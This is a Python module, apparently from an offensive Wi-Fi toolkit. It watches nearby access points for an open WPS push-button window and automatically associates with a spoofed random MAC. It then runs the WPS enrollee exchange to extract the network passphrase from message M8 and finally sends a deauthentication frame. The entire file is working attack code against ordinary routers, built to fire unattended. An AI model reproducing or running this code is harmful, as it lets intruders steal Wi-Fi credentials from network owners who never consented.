"""WpsPbcCapture: live orchestrator for opportunistic WPS Push-Button capture.

Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
the Scanner/Focus arming wires to; detection itself is passive
(``AccessPoint.wps_pbc_active``).
"""

from __future__ import annotations

import logging
from typing import Optional

from .campaign import Campaign
from .auth_assoc import (
    Association, WlanTransport, build_client_leaving, random_client_mac,
)
from wifit3.dot11 import str_to_mac
from wifit3.dot11.wsc.assoc_ie import WPS_REQ_ENROLLEE, wps_assoc_ie
from .wps.enrollee import WpsEnrollee
from .wps.registrar import AttemptOutcome, PinResult

logger = logging.getLogger(__name__)


class PbcWatcher:
    """Edge-detects PBC walk windows opening across the live AP list."""

    def __init__(self):
        self._active: set = set()

    def new_windows(self, aps):
        current = {ap.bssid for ap in aps if getattr(ap, "wps_pbc_active", False)}
        opened = current - self._active
        self._active = current
        return [ap for ap in aps if ap.bssid in opened]


class WpsPbcCapture(Campaign):
    button_id = None   # no button, auto-triggered when a PBC window opens
    key = "pbc"
    stoppable = False

    def __init__(self, array, target, our_mac: Optional[bytes] = None, log=None,
                 tx_observer=None):
        super().__init__(ap=target, array=array)
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.our_mac = our_mac or random_client_mac()
        self.log = log or logger.info
        self.tx_observer = tx_observer
        self.outcome: Optional[AttemptOutcome] = None
        self.error: Optional[Exception] = None

    async def _loop(self) -> None:
        """One PBC enrollment attempt. The screen reads ``outcome`` once ``done``."""
        try:
            self.outcome = await self.capture()
        except Exception as exc:
            self.error = exc

    async def capture(self) -> AttemptOutcome:
        """One PBC enrollment attempt. Returns the WpsEnrollee outcome."""
        if self.stopped:
            return AttemptOutcome(PinResult.ABORTED, "<PBC>", detail="stopped before start")
        if self.iface is None:
            return AttemptOutcome(PinResult.ABORTED, "<PBC>", detail="no card can reach channel")
        # The lease arms active-monitor + own-MAC registration + ACK tally on enter, and
        # clears all three (and restores the channel) on exit.
        lease = self.array.lease(channel=self.channel, fake_mac=self.our_mac,
                                 bssid=str_to_mac(self.bssid), ack_tally=True, iface=self.iface)
        async with lease as iface:
            if lease.mac:
                self.our_mac = str_to_mac(lease.mac)
            assoc = Association(iface, self.bssid, self.target.ssid or "",
                                self.channel, our_mac=self.our_mac,
                                assoc_trailer_ies=wps_assoc_ie(WPS_REQ_ENROLLEE),
                                should_stop=lambda: self.stopped)
            assoc.start()
            warning = iface.active_monitor_warning()
            if isinstance(warning, str):
                self.log(warning)
                self.log("[dim]Continuing anyway (expect failures/timeouts)[/dim]")
            transport = WlanTransport(iface, str_to_mac(self.bssid), self.our_mac,
                                      tx_observer=self.tx_observer)
            transport.start()
            outcome = None
            try:
                if self.stopped:
                    outcome = AttemptOutcome(PinResult.ABORTED, "<PBC>", detail="stopped by user")
                else:
                    if not await assoc.associate():
                        self.log(f"assoc failed ({assoc.fail_reason}); running EAPOL anyway")
                    outcome = await WpsEnrollee(transport, str_to_mac(self.bssid),
                                                self.our_mac, log=self.log,
                                                should_stop=lambda: self.stopped,
                                                msg_timeout=8.0, eapol_start_timeout=6.0,
                                                overall_timeout=40.0,
                                                tx_ack=True,
                                                ack_resends=4).run()
            finally:
                # Abandoning a (possibly mid-exchange) attempt: tell the AP we're leaving so
                # it drops our EAP session. Sent while the lease is still open (own MAC still
                # armed), so our own leaving-deauth is TA-dropped from the sink.
                if outcome is None or outcome.result is not PinResult.SUCCESS:
                    try:
                        await iface.send_no_wait(
                            build_client_leaving(str_to_mac(self.bssid), self.our_mac))
                    except Exception:
                        logger.debug("PBC leaving-deauth failed", exc_info=True)
                transport.stop()
                assoc.stop()
        return outcome
